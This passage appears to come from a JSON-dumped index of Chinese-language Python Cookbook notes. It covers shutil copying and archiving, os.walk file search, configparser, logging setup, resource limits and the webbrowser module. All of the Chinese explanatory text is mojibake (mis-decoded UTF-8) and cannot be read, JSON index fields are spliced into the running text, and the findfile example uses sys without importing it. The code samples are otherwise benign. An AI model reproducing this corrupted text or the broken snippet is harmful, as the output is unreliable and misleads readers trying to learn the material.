å¤åˆ¶æ–‡ä»¶å¤¹çš„ä¸€ä¸ªæ£˜æ‰‹çš„é—®é¢˜æ˜¯å¯¹äºé”™è¯¯çš„å¤„ç†ã€‚ä¾‹å¦‚ï¼Œåœ¨å¤åˆ¶ è¿‡ç¨‹ä¸­ï¼Œå‡½æ•°å¯èƒ½ä¼šç¢°åˆ°æŸåçš„ç¬¦å·é“¾æ¥ï¼Œå› ä¸ºæƒé™æ— æ³•è®¿é—®æ–‡ä»¶çš„é—®é¢˜ç­‰ç­‰ã€‚ä¸ºäº†è§£ å†³è¿™ä¸ªé—®é¢˜ï¼Œæ‰€æœ‰ç¢°åˆ°çš„é—®é¢˜ä¼šè¢«æ”¶é›†åˆ°ä¸€ä¸ªåˆ—è¡¨ä¸­å¹¶æ‰“åŒ…ä¸ºä¸€ä¸ªå•ç‹¬çš„å¼‚å¸¸ï¼Œåˆ°äº†æœ€ åå†æŠ›å‡ºã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­: try: shutil.copytree(src, dst) except shutil.Error as e: for src, dst, msg in e.args[0]: # src is source name # dst is destination name # msg is error message from exception print(dst, src, msg) å¦‚æœä½ æä¾›å…³é”®å­—å‚æ•° ignore_dangling_symlinks=True ï¼Œè¿™æ—¶å€™ copytree() ä¼šå¿½ç•¥æ‰æ— æ•ˆç¬¦å·é“¾æ¥ã€‚ æœ¬èŠ‚æ¼”ç¤ºçš„è¿™äº›å‡½æ•°éƒ½æ˜¯æœ€å¸¸è§çš„ã€‚ä¸è¿‡ï¼Œshutil è¿˜æœ‰æ›´å¤šçš„å’Œå¤åˆ¶æ•°æ®ç›¸å…³çš„ æ“ä½œã€‚å®ƒçš„æ–‡æ¡£å¾ˆå€¼å¾—ä¸€çœ‹ï¼Œå‚è€ƒ: https://docs.python.org/3/library/shutil.html åˆ›å»ºå’Œè§£å‹å½’æ¡£æ–‡ä»¶ é—®é¢˜ ä½ éœ€è¦åˆ›å»ºæˆ–è§£å‹å¸¸è§æ ¼å¼çš„å½’æ¡£æ–‡ä»¶ï¼ˆæ¯”å¦‚.tar, .tgz æˆ–.zipï¼‰ è§£å†³æ–¹æ¡ˆ shutil æ¨¡å—æ‹¥æœ‰ä¸¤ä¸ªå‡½æ•°â€”â€”make_archive() å’Œ unpack_archive() å¯æ´¾ä¸Šç”¨ åœº: >>> import shutil >>> shutil.unpack_archive('Python-3.3.0.tgz') >>> shutil.make_archive('py33','zip','Python-3.3.0') '/Users/beazley/Downloads/py33.zip' >>> make_archive() çš„ ç¬¬ äºŒ ä¸ª å‚ æ•° æ˜¯ æœŸ æœ› çš„ è¾“ å‡º æ ¼ å¼ã€‚å¯ ä»¥ ä½¿ ç”¨ get_archive_formats() è·å–æ‰€æœ‰æ”¯æŒçš„å½’æ¡£æ ¼å¼åˆ—è¡¨ã€‚ä¾‹å¦‚: >>> shutil.get_archive_formats() [('bztar', \"bzip2'ed tar-file\"), ('gztar', \"gzip'ed tar-file\"), ('tar', 'uncompressed tar file'), ('zip', 'ZIP file')] >>> è®¨è®º Python è¿˜æœ‰å…¶ä»–çš„æ¨¡å—å¯ç”¨æ¥å¤„ç†å¤šç§å½’æ¡£æ ¼å¼ï¼ˆæ¯”å¦‚ tarfile, zipfile, gzip, bz2ï¼‰ çš„åº•å±‚ç»†èŠ‚ã€‚ä¸è¿‡ï¼Œå¦‚æœä½ ä»…ä»…åªæ˜¯è¦åˆ›å»ºæˆ–æå–æŸä¸ªå½’æ¡£ï¼Œå°±æ²¡æœ‰å¿…è¦ä½¿ç”¨åº•å±‚åº“ äº†ã€‚å¯ä»¥ç›´æ¥ä½¿ç”¨ shutil ä¸­çš„è¿™äº›é«˜å±‚å‡½æ•°ã€‚ è¿™äº›å‡½æ•°è¿˜æœ‰å¾ˆå¤šå…¶ä»–é€‰é¡¹ï¼Œç”¨äºæ—¥å¿—æ‰“å°ã€é¢„æ£€ã€æ–‡ä»¶æƒé™ç­‰ç­‰ã€‚ é€šè¿‡æ–‡ä»¶åæŸ¥æ‰¾æ–‡ä»¶ é—®é¢˜ ä½ éœ€è¦å†™ä¸€ä¸ªæ¶‰åŠåˆ°æ–‡ä»¶æŸ¥æ‰¾æ“ä½œçš„è„šæœ¬ï¼Œæ¯”å¦‚å¯¹æ—¥å¿—å½’æ¡£æ–‡ä»¶çš„é‡å‘½åå·¥å…·ï¼Œä½  ä¸æƒ³åœ¨ Python è„šæœ¬ä¸­è°ƒç”¨ shellï¼Œæˆ–è€…ä½ è¦å®ç°ä¸€äº› shell ä¸èƒ½åšçš„åŠŸèƒ½ã€‚ è§£å†³æ–¹æ¡ˆ æŸ¥æ‰¾æ–‡ä»¶ï¼Œå¯ä½¿ç”¨ os.walk() å‡½æ•°ï¼Œä¼ ä¸€ä¸ªé¡¶çº§ç›®å½•åç»™å®ƒã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼ŒæŸ¥ æ‰¾ç‰¹å®šçš„æ–‡ä»¶åå¹¶ç­”åº”æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶å…¨è·¯å¾„ï¼š #!/usr/bin/env python3.3 import os def findfile(start, name): for relpath, dirs, files in os.walk(start): if name in files: full_path = os.path.join(start, relpath, name) print(os.path.normpath(os.path.abspath(full_path))) if __name__ == '__main__': findfile(sys.argv[1], sys.argv[2]) findfileå‚æ•°ä¸ºåˆå§‹æŸ¥æ‰¾ç›®å½•ä¸æŸ¥æ‰¾æ–‡ä»¶å è®¨è®º os.walk() æ–¹æ³•ä¸ºæˆ‘ä»¬éå†ç›®å½•æ ‘ï¼Œæ¯æ¬¡è¿›å…¥ä¸€ä¸ªç›®å½•ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ªä¸‰å…ƒç»„ï¼ŒåŒ… å«ç›¸å¯¹äºæŸ¥æ‰¾ç›®å½•çš„ç›¸å¯¹è·¯å¾„ï¼Œä¸€ä¸ªè¯¥ç›®å½•ä¸‹çš„ç›®å½•ååˆ—è¡¨ï¼Œä»¥åŠé‚£ä¸ªç›®å½•ä¸‹é¢çš„æ–‡ä»¶ ååˆ—è¡¨ã€‚ å¯¹äºæ¯ä¸ªå…ƒç»„ï¼Œåªéœ€æ£€æµ‹ä¸€ä¸‹ç›®æ ‡æ–‡ä»¶åæ˜¯å¦åœ¨æ–‡ä»¶åˆ—è¡¨ä¸­ã€‚å¦‚æœæ˜¯å°±ä½¿ç”¨ os. path.join() åˆå¹¶è·¯å¾„ã€‚ä¸ºäº†é¿å…å¥‡æ€ªçš„è·¯å¾„åæ¯”å¦‚ ././foo//bar ï¼Œä½¿ç”¨äº†å¦å¤–ä¸¤ä¸ª å‡½æ•°æ¥ä¿®æ­£ç»“æœã€‚ç¬¬ä¸€ä¸ªæ˜¯ os.path.abspath() , å®ƒæ¥å—ä¸€ä¸ªè·¯å¾„ï¼Œå¯èƒ½æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œ æœ€åè¿”å›ç»å¯¹è·¯å¾„ã€‚ç¬¬äºŒä¸ªæ˜¯ os.path.normpath() ï¼Œç”¨æ¥è¿”å›æ­£å¸¸è·¯å¾„ï¼Œå¯ä»¥è§£å†³åŒ æ–œæ†ã€å¯¹ç›®å½•çš„å¤šé‡å¼•ç”¨çš„é—®é¢˜ç­‰ã€‚ å°½ç®¡è¿™ä¸ªè„šæœ¬ç›¸å¯¹äº UNIX å¹³å°ä¸Šé¢çš„å¾ˆå¤šæŸ¥æ‰¾æ¥è®²è¦ç®€å•å¾ˆå¤šï¼Œå®ƒè¿˜æœ‰è·¨å¹³å° çš„ä¼˜åŠ¿ã€‚å¹¶ä¸”ï¼Œè¿˜èƒ½å¾ˆè½»æ¾çš„åŠ å…¥å…¶ä»–çš„åŠŸèƒ½ã€‚ è¯»å–é…ç½®æ–‡ä»¶ é—®é¢˜ æ€æ ·è¯»å–æ™®é€š.ini æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼Ÿ è§£å†³æ–¹æ¡ˆ configparser æ¨¡å—èƒ½è¢«ç”¨æ¥è¯»å–é…ç½®æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ä½ æœ‰å¦‚ä¸‹çš„é…ç½®æ–‡ä»¶: ; config.ini ; Sample configuration file [installation] library=%(prefix)s/lib include=%(prefix)s/include bin=%(prefix)s/bin prefix=/usr/local # Setting related to debug configuration [debug] log_errors=true show_warnings=False [server] port: 8080 nworkers: 32 pid-file=/tmp/spam.pid root=/www/root signature: ================================= Brought to you by the Python Cookbook ================================= ä¸‹é¢æ˜¯ä¸€ä¸ªè¯»å–å’Œæå–å…¶ä¸­å€¼çš„ä¾‹å­: >>> from configparser import ConfigParser >>> cfg = ConfigParser() >>> cfg.read('config.ini') ['config.ini'] >>> cfg.sections() ['installation', 'debug', 'server'] >>> cfg.get('installation','library') '/usr/local/lib' >>> cfg.getboolean('debug','log_errors') True >>> cfg.getint('server','port') 8080 >>> cfg.getint('server','nworkers') 32 >>> print(cfg.get('server','signature')) \\================================= Brought to you by the Python Cookbook \\================================= >>> å¦‚æœæœ‰éœ€è¦ï¼Œä½ è¿˜èƒ½ä¿®æ”¹é…ç½®å¹¶ä½¿ç”¨ cfg.write() æ–¹æ³•å°†å…¶å†™å›åˆ°æ–‡ä»¶ä¸­ã€‚ä¾‹å¦‚: >>> cfg.set('server','port','9000') >>> cfg.set('debug','log_errors','False') >>> import sys >>> cfg.write(sys.stdout) è®¨è®º é…ç½®æ–‡ä»¶ä½œä¸ºä¸€ç§å¯è¯»æ€§å¾ˆå¥½çš„æ ¼å¼ï¼Œéå¸¸é€‚ç”¨äºå­˜å‚¨ç¨‹åºä¸­çš„é…ç½®æ•°æ®ã€‚åœ¨æ¯ä¸ª é…ç½®æ–‡ä»¶ä¸­ï¼Œé…ç½®æ•°æ®ä¼šè¢«åˆ†ç»„ï¼ˆæ¯”å¦‚ä¾‹å­ä¸­çš„\"installation\"ã€\"debug\"å’Œ\"server\"ï¼‰ã€‚ æ¯ä¸ªåˆ†ç»„åœ¨å…¶ä¸­æŒ‡å®šå¯¹åº”çš„å„ä¸ªå˜é‡å€¼ã€‚ å¯¹äºå¯å®ç°åŒæ ·åŠŸèƒ½çš„é…ç½®æ–‡ä»¶å’Œ Python æºæ–‡ä»¶æ˜¯æœ‰å¾ˆå¤§çš„ä¸åŒçš„ã€‚é¦–å…ˆï¼Œé…ç½® æ–‡ä»¶çš„è¯­æ³•è¦æ›´è‡ªç”±äº›ï¼Œä¸‹é¢çš„èµ‹å€¼è¯­å¥æ˜¯ç­‰æ•ˆçš„: prefix=/usr/local prefix: /usr/local é…ç½®æ–‡ä»¶ä¸­çš„åå­—æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚ä¾‹å¦‚: >>> cfg.get('installation','PREFIX') '/usr/local' >>> cfg.get('installation','prefix') '/usr/local' >>> åœ¨è§£æå€¼çš„æ—¶å€™ï¼Œgetboolean() æ–¹æ³•æŸ¥æ‰¾ä»»ä½•å¯è¡Œçš„å€¼ã€‚ä¾‹å¦‚ä¸‹é¢éƒ½æ˜¯ç­‰ä»·çš„: log_errors = true log_errors = TRUE log_errors = Yes log_errors = 1 æˆ–è®¸é…ç½®æ–‡ä»¶å’Œ Python ä»£ç æœ€å¤§çš„ä¸åŒåœ¨äºï¼Œå®ƒå¹¶ä¸æ˜¯ä»ä¸Šè€Œä¸‹çš„é¡ºåºæ‰§è¡Œã€‚æ–‡ ä»¶æ˜¯å®‰è£…ä¸€ä¸ªæ•´ä½“è¢«è¯»å–çš„ã€‚å¦‚æœç¢°åˆ°äº†å˜é‡æ›¿æ¢ï¼Œå®ƒå®é™…ä¸Šå·²ç»è¢«æ›¿æ¢å®Œæˆäº†ã€‚ä¾‹ å¦‚ï¼Œåœ¨ä¸‹é¢è¿™ä¸ªé…ç½®ä¸­ï¼Œprefix å˜é‡åœ¨ä½¿ç”¨å®ƒçš„å˜é‡ä¹‹å‰æˆ–ä¹‹åå®šä¹‰éƒ½æ˜¯å¯ä»¥çš„: [installation] library=%(prefix)s/lib include=%(prefix)s/include bin=%(prefix)s/bin prefix=/usr/local ConfigParser æœ‰ä¸ªå®¹æ˜“è¢«å¿½è§†çš„ç‰¹æ€§æ˜¯å®ƒèƒ½ä¸€æ¬¡è¯»å–å¤šä¸ªé…ç½®æ–‡ä»¶ç„¶ååˆå¹¶æˆä¸€ ä¸ªé…ç½®ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ä¸€ä¸ªç”¨æˆ·åƒä¸‹é¢è¿™æ ·æ„é€ äº†ä»–ä»¬çš„é…ç½®æ–‡ä»¶: ; ~/.config.ini [installation] prefix=/Users/beazley/test [debug] log_errors=False è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼Œå®ƒå°±èƒ½è·Ÿä¹‹å‰çš„é…ç½®åˆå¹¶èµ·æ¥ã€‚å¦‚: >>> # Previously read configuration >>> cfg.get('installation', 'prefix') '/usr/local' >>> # Merge in user-specific configuration >>> import os >>> cfg.read(os.path.expanduser('~/.config.ini')) ['/Users/beazley/.config.ini'] >>> cfg.get('installation', 'prefix') '/Users/beazley/test' >>> cfg.get('installation', 'library') '/Users/beazley/test/lib' >>> cfg.getboolean('debug', 'log_errors') False >>> ä»”ç»†è§‚å¯Ÿä¸‹ prefix å˜é‡æ˜¯æ€æ ·è¦†ç›–å…¶ä»–ç›¸å…³å˜é‡çš„ï¼Œæ¯”å¦‚ library çš„è®¾å®šå€¼ã€‚äº§ ç”Ÿè¿™ç§ç»“æœçš„åŸå› æ˜¯å˜é‡çš„æ”¹å†™é‡‡å–çš„æ˜¯åå‘åˆ¶äººç­–ç•¥ï¼Œä»¥æœ€åä¸€ä¸ªä¸ºå‡†ã€‚ æœ€åè¿˜æœ‰å¾ˆé‡è¦ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯ Python å¹¶ä¸èƒ½æ”¯æŒ.ini æ–‡ä»¶åœ¨å…¶ä»–ç¨‹åºï¼ˆæ¯”å¦‚ windows åº”ç”¨ç¨‹åºï¼‰ä¸­çš„æ‰€æœ‰ç‰¹æ€§ã€‚ ç»™ç®€å•è„šæœ¬å¢åŠ æ—¥å¿—åŠŸèƒ½ é—®é¢˜ ä½ å¸Œæœ›åœ¨è„šæœ¬å’Œç¨‹åºä¸­å°†è¯Šæ–­ä¿¡æ¯å†™å…¥æ—¥å¿—æ–‡ä»¶ã€‚ è§£å†³æ–¹æ¡ˆ æ‰“å°æ—¥å¿—æœ€ç®€å•æ–¹å¼æ˜¯ä½¿ç”¨ logging æ¨¡å—ã€‚ ä»£ç ä¸­ç¼–ç å¯ä»¥ä½¿ç”¨basicConfig, ä¹Ÿå¯ä»¥ä½¿ç”¨inié…ç½®æ–‡ä»¶, å¦‚: logging.config.fileConfig('logconfig.ini') logconfig.iniå†…å®¹: [loggers] keys=root [handlers] keys=defaultHandler [formatters] keys=defaultFormatter [logger_root] level=INFO handlers=defaultHandler qualname=root [handler_defaultHandler] class=FileHandler formatter=defaultFormatter args=('app.log', 'a') [formatter_defaultFormatter] format=%(levelname)s:%(name)s:%(message)s å¦‚æœä½ æƒ³ä¿®æ”¹é…ç½®ï¼Œå¯ä»¥ç›´æ¥ç¼–è¾‘æ–‡ä»¶ logconfig.ini å³å¯ã€‚ è®¨è®º å°½ç®¡å¯¹äº logging æ¨¡å—è€Œå·²æœ‰å¾ˆå¤šæ›´é«˜çº§çš„é…ç½®é€‰é¡¹ï¼Œä¸è¿‡è¿™é‡Œçš„æ–¹æ¡ˆå¯¹äºç®€å• çš„ç¨‹åºå’Œè„šæœ¬å·²ç»è¶³å¤Ÿäº†ã€‚åªæƒ³åœ¨è°ƒç”¨æ—¥å¿—æ“ä½œå‰å…ˆæ‰§è¡Œä¸‹ basicConfig() å‡½æ•°æ–¹æ³•ï¼Œä½  çš„ç¨‹åºå°±èƒ½äº§ç”Ÿæ—¥å¿—è¾“å‡ºäº†ã€‚ å¦‚ æœ ä½  æƒ³ è¦ ä½  çš„ æ—¥ å¿— æ¶ˆ æ¯ å†™ åˆ° æ ‡ å‡† é”™ è¯¯ ä¸­ï¼Œ è€Œ ä¸ æ˜¯ æ—¥ å¿— æ–‡ ä»¶ ä¸­ï¼Œ è°ƒ ç”¨ basicConfig() æ—¶ä¸ä¼ æ–‡ä»¶åå‚æ•°å³å¯ã€‚ä¾‹å¦‚: logging.basicConfig(level=logging.INFO) basicConfig() åœ¨ç¨‹åºä¸­åªèƒ½è¢«æ‰§è¡Œä¸€æ¬¡ã€‚å¦‚æœä½ ç¨åæƒ³æ”¹å˜æ—¥å¿—é…ç½®ï¼Œå°±éœ€è¦å…ˆ è·å– root logger ï¼Œç„¶åç›´æ¥ä¿®æ”¹å®ƒã€‚ ç»™å‡½æ•°åº“å¢åŠ æ—¥å¿—åŠŸèƒ½ é—®é¢˜ ä½ æƒ³ç»™æŸä¸ªå‡½æ•°åº“å¢åŠ æ—¥å¿—åŠŸèƒ½ï¼Œä½†æ˜¯åˆä¸èƒ½å½±å“åˆ°é‚£äº›ä¸ä½¿ç”¨æ—¥å¿—åŠŸèƒ½çš„ç¨‹åºã€‚ è§£å†³æ–¹æ¡ˆ å¯¹äºæƒ³è¦æ‰§è¡Œæ—¥å¿—æ“ä½œçš„å‡½æ•°åº“è€Œå·²ï¼Œä½ åº”è¯¥åˆ›å»ºä¸€ä¸ªä¸“å±çš„ logger å¯¹è±¡ï¼Œå¹¶ä¸” åƒä¸‹é¢è¿™æ ·åˆå§‹åŒ–é…ç½®: # somelib.py import logging log = logging.getLogger(__name__) log.addHandler(logging.NullHandler()) # Example function (for testing) def func(): log.critical('A Critical Error!') log.debug('A debug message') ä½¿ç”¨è¿™ä¸ªé…ç½®ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ä¼šæ‰“å°æ—¥å¿—ã€‚ ä¸è¿‡ï¼Œå¦‚æœé…ç½®è¿‡æ—¥å¿—ç³»ç»Ÿï¼Œé‚£ä¹ˆæ—¥å¿—æ¶ˆæ¯æ‰“å°å°±å¼€å§‹ç”Ÿæ•ˆï¼Œä¾‹å¦‚: >>> import logging >>> logging.basicConfig() >>> somelib.func() CRITICAL:somelib:A Critical Error! >>> è®¨è®º é€šå¸¸æ¥è®²ï¼Œä½ ä¸åº”è¯¥åœ¨å‡½æ•°åº“ä»£ç ä¸­è‡ªå·±é…ç½®æ—¥å¿—ç³»ç»Ÿï¼Œæˆ–è€…æ˜¯å·²ç»å‡å®šæœ‰ä¸ªå·²ç» å­˜åœ¨çš„æ—¥å¿—é…ç½®äº†ã€‚ è°ƒç”¨ getLogger(__name__) åˆ›å»ºä¸€ä¸ªå’Œè°ƒç”¨æ¨¡å—åŒåçš„ logger æ¨¡å—ã€‚ç”±äºæ¨¡å—éƒ½ æ˜¯å”¯ä¸€çš„ï¼Œå› æ­¤åˆ›å»ºçš„ logger ä¹Ÿå°†æ˜¯å”¯ä¸€çš„ã€‚ log.addHandler(logging.NullHandler()) æ“ä½œå°†ä¸€ä¸ªç©ºå¤„ç†å™¨ç»‘å®šåˆ°åˆšåˆšå·²ç» åˆ›å»ºå¥½çš„ logger å¯¹è±¡ä¸Šã€‚ä¸€ä¸ªç©ºå¤„ç†å™¨é»˜è®¤ä¼šå¿½ç•¥è°ƒç”¨æ‰€æœ‰çš„æ—¥å¿—æ¶ˆæ¯ã€‚å› æ­¤ï¼Œå¦‚æœä½¿ ç”¨è¯¥å‡½æ•°åº“çš„æ—¶å€™è¿˜æ²¡æœ‰é…ç½®æ—¥å¿—ï¼Œé‚£ä¹ˆå°†ä¸ä¼šæœ‰æ¶ˆæ¯æˆ–è­¦å‘Šå‡ºç°ã€‚ è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯å¯¹äºå„ä¸ªå‡½æ•°åº“çš„æ—¥å¿—é…ç½®å¯ä»¥æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œä¸å½±å“å…¶ä»–åº“çš„æ—¥ å¿—é…ç½®ã€‚ å®ç°ä¸€ä¸ªè®¡æ—¶å™¨ é—®é¢˜ ä½ æƒ³è®°å½•ç¨‹åºæ‰§è¡Œå¤šä¸ªä»»åŠ¡æ‰€èŠ±è´¹çš„æ—¶é—´ è§£å†³æ–¹æ¡ˆ time æ¨¡å—åŒ…å«å¾ˆå¤šå‡½æ•°æ¥æ‰§è¡Œè·Ÿæ—¶é—´æœ‰å…³çš„å‡½æ•°ã€‚å°½ç®¡å¦‚æ­¤ï¼Œé€šå¸¸æˆ‘ä»¬ä¼šåœ¨æ­¤åŸº ç¡€ä¹‹ä¸Šæ„é€ ä¸€ä¸ªæ›´é«˜çº§çš„æ¥å£æ¥æ¨¡æ‹Ÿä¸€ä¸ªè®¡æ—¶å™¨ é™åˆ¶å†…å­˜å’Œ CPU çš„ä½¿ç”¨é‡ é—®é¢˜ ä½ æƒ³å¯¹åœ¨ Unix ç³»ç»Ÿä¸Šé¢è¿è¡Œçš„ç¨‹åºè®¾ç½®å†…å­˜æˆ– CPU çš„ä½¿ç”¨é™åˆ¶ã€‚ è§£å†³æ–¹æ¡ˆ resource æ¨¡å—èƒ½åŒæ—¶æ‰§è¡Œè¿™ä¸¤ä¸ªä»»åŠ¡ã€‚ä¾‹å¦‚ï¼Œè¦é™åˆ¶ CPU æ—¶é—´ï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ · åš: import signal import resource import os def time_exceeded(signo, frame): print(\"Time's up!\") raise SystemExit(1) def set_max_runtime(seconds): # Install the signal handler and set a resource limit soft, hard = resource.getrlimit(resource.RLIMIT_CPU) resource.setrlimit(resource.RLIMIT_CPU, (seconds, hard)) signal.signal(signal.SIGXCPU, time_exceeded) if __name__ == '__main__': set_max_runtime(15) while True: pass ç¨‹åºè¿è¡Œæ—¶ï¼ŒSIGXCPU ä¿¡å·åœ¨æ—¶é—´è¿‡æœŸæ—¶è¢«ç”Ÿæˆï¼Œç„¶åæ‰§è¡Œæ¸…ç†å¹¶é€€å‡ºã€‚ è¦é™åˆ¶å†…å­˜ä½¿ç”¨ï¼Œè®¾ç½®å¯ä½¿ç”¨çš„æ€»å†…å­˜å€¼å³å¯ï¼Œå¦‚ä¸‹: import resource def limit_memory(maxsize): soft, hard = resource.getrlimit(resource.RLIMIT_AS) resource.setrlimit(resource.RLIMIT_AS, (maxsize, hard)) åƒè¿™æ ·è®¾ç½®äº†å†…å­˜é™åˆ¶åï¼Œç¨‹åºè¿è¡Œåˆ°æ²¡æœ‰å¤šä½™å†…å­˜æ—¶ä¼šæŠ›å‡º MemoryError å¼‚å¸¸ã€‚ è®¨è®º åœ¨æœ¬èŠ‚ä¾‹å­ä¸­ï¼Œsetrlimit() å‡½æ•°è¢«ç”¨æ¥è®¾ç½®ç‰¹å®šèµ„æºä¸Šé¢çš„è½¯é™åˆ¶å’Œç¡¬é™åˆ¶ã€‚ è½¯é™åˆ¶ æ˜¯ä¸€ä¸ªå€¼ï¼Œå½“è¶…è¿‡è¿™ä¸ªå€¼çš„æ—¶å€™æ“ä½œç³»ç»Ÿé€šå¸¸ä¼šå‘é€ä¸€ä¸ªä¿¡å·æ¥é™åˆ¶æˆ–é€šçŸ¥è¯¥è¿› ç¨‹ã€‚ ç¡¬é™åˆ¶ æ˜¯ç”¨æ¥æŒ‡å®šè½¯é™åˆ¶èƒ½è®¾å®šçš„æœ€å¤§å€¼ã€‚é€šå¸¸æ¥è®²ï¼Œè¿™ä¸ªç”±ç³»ç»Ÿç®¡ç†å‘˜é€šè¿‡è®¾ç½® ç³»ç»Ÿçº§å‚æ•°æ¥å†³å®šã€‚å°½ç®¡ç¡¬é™åˆ¶å¯ä»¥æ”¹å°ä¸€ç‚¹ï¼Œä½†æ˜¯æœ€å¥½ä¸è¦ä½¿ç”¨ç”¨æˆ·è¿›ç¨‹å»ä¿®æ”¹ã€‚ setrlimit() å‡½æ•°è¿˜èƒ½è¢«ç”¨æ¥è®¾ç½®å­è¿›ç¨‹æ•°é‡ã€æ‰“å¼€æ–‡ä»¶æ•°ä»¥åŠç±»ä¼¼ç³»ç»Ÿèµ„æºçš„ é™åˆ¶ã€‚æ›´å¤šè¯¦æƒ…è¯·å‚è€ƒ resource æ¨¡å—çš„æ–‡æ¡£ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯æœ¬èŠ‚å†…å®¹åªèƒ½é€‚ç”¨äº Unix ç³»ç»Ÿï¼Œå¹¶ä¸”ä¸ä¿è¯æ‰€æœ‰ç³»ç»Ÿéƒ½èƒ½å¦‚æœŸå·¥ ä½œã€‚æ¯”å¦‚æˆ‘ä»¬åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œå®ƒèƒ½åœ¨ Linux ä¸Šé¢æ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯åœ¨ OS X ä¸Šå´ä¸èƒ½ã€‚ å¯åŠ¨ä¸€ä¸ª WEB æµè§ˆå™¨ é—®é¢˜ ä½ æƒ³é€šè¿‡è„šæœ¬å¯åŠ¨æµè§ˆå™¨å¹¶æ‰“å¼€æŒ‡å®šçš„ URL ç½‘é¡µ è§£å†³æ–¹æ¡ˆ webbrowser æ¨¡å—èƒ½è¢«ç”¨æ¥å¯åŠ¨ä¸€ä¸ªæµè§ˆå™¨ï¼Œå¹¶ä¸”ä¸å¹³å°æ— å…³ã€‚ä¾‹å¦‚: >>> import webbrowser >>> webbrowser.open('http://www.python.org') True >>> å®ƒä¼šä½¿ç”¨é»˜è®¤æµè§ˆå™¨æ‰“å¼€æŒ‡å®šç½‘é¡µã€‚å¦‚æœä½ è¿˜æƒ³å¯¹ç½‘é¡µæ‰“å¼€æ–¹å¼åšæ›´å¤šæ§åˆ¶ï¼Œè¿˜å¯ ä»¥ä½¿ç”¨ä¸‹é¢è¿™äº›å‡½æ•°: >>> # Open the page in a new browser window >>> webbrowser.open_new('http://www.python.org') True >>> >>> # Open the page in a new browser tab >>> webbrowser.open_new_tab('http://www.python.org') True >>> è¿™æ ·å°±å¯ä»¥æ‰“å¼€ä¸€ä¸ªæ–°çš„æµè§ˆå™¨çª—å£æˆ–è€…æ ‡ç­¾ï¼Œåªè¦æµè§ˆå™¨æ”¯æŒå°±è¡Œã€‚ å¦‚æœä½ æƒ³æŒ‡å®šæµè§ˆå™¨ç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨ webbrowser.get() å‡½æ•°æ¥æŒ‡å®šæŸä¸ªç‰¹å®šæµè§ˆ å™¨ã€‚ä¾‹å¦‚: >>> c = webbrowser.get('firefox') >>> c.open('http://www.python.org') True >>> c.open_new_tab('http://docs.python.org') True >>> å¯¹äºæ”¯æŒçš„æµè§ˆå™¨åç§°åˆ—è¡¨å¯æŸ¥é˜… Python æ–‡æ¡£ è®¨è®º åœ¨è„šæœ¬ä¸­æ‰“å¼€æµè§ˆå™¨æœ‰æ—¶å€™ä¼šå¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼ŒæŸä¸ªè„šæœ¬æ‰§è¡ŒæŸä¸ªæœåŠ¡å™¨å‘å¸ƒä»»åŠ¡ï¼Œ ä½ æƒ³å¿«é€Ÿæ‰“å¼€ä¸€ä¸ªæµè§ˆå™¨æ¥ç¡®ä¿å®ƒå·²ç»æ­£å¸¸è¿è¡Œäº†ã€‚æˆ–è€…æ˜¯æŸä¸ªç¨‹åºä»¥ HTML ç½‘é¡µæ ¼ å¼è¾“å‡ºæ•°æ®ï¼Œä½ æƒ³æ‰“å¼€æµè§ˆå™¨æŸ¥çœ‹ç»“æœã€‚ä¸ç®¡æ˜¯ä¸Šé¢å“ªç§æƒ…å†µï¼Œä½¿ç”¨ webbrowser æ¨¡å— éƒ½æ˜¯ä¸€ä¸ªç®€å•å®ç”¨çš„è§£å†³æ–¹æ¡ˆã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-Script-programming-and-system-management.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Script-programming-and-system-management.html"},{"title":"å­—ç¬¦ä¸²æ“ä½œ","text":"åˆ†éš”å­—ç¬¦ä¸²ä¸ºåˆ—è¡¨ str.split re.split , è§ /docs/åç«¯/python/pythonæ ‡å‡†åº“/re split ç”¨äº ç®€å•çš„å­—ç¬¦ä¸²åˆ†å‰²æƒ…å½¢ï¼Œå®ƒå¹¶ä¸å…è®¸æœ‰ å¤šä¸ªåˆ†éš”ç¬¦æˆ–è€…æ˜¯åˆ†éš”ç¬¦å‘¨å›´ä¸ç¡®å®šçš„ç©ºæ ¼ã€‚ å½“ä½ éœ€è¦æ›´åŠ çµæ´»çš„åˆ‡å‰²å­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œ æœ€å¥½ä½¿ç”¨ re.split() æ–¹æ³•: >>> line = 'asdf fjdk; afed, fjek,asdf, foo' >>> import re >>> re.split(r'[;,\\s]\\s*', line) ['asdf', 'fjdk', 'afed', 'fjek', 'asdf', 'foo'] å½“ä½ ä½¿ç”¨ re.split() å‡½æ•°æ—¶å€™ï¼Œ éœ€è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯æ­£åˆ™è¡¨è¾¾å¼ä¸­æ˜¯å¦åŒ…å«ä¸€ä¸ªæ‹¬ å·æ•è·åˆ†ç»„ã€‚ å¦‚æœä½¿ç”¨äº†æ•è·åˆ†ç»„ï¼Œé‚£ä¹ˆè¢«åŒ¹é…çš„æ–‡æœ¬ä¹Ÿå°†å‡ºç°åœ¨ç»“æœåˆ—è¡¨ä¸­: >>> fields = re.split(r'(;|,|\\s)\\s*', line) >>> fields ['asdf', ' ', 'fjdk', ';', 'afed', ',', 'fjek', ',', 'asdf', ',', 'foo'] >>> å¦‚æœä½ 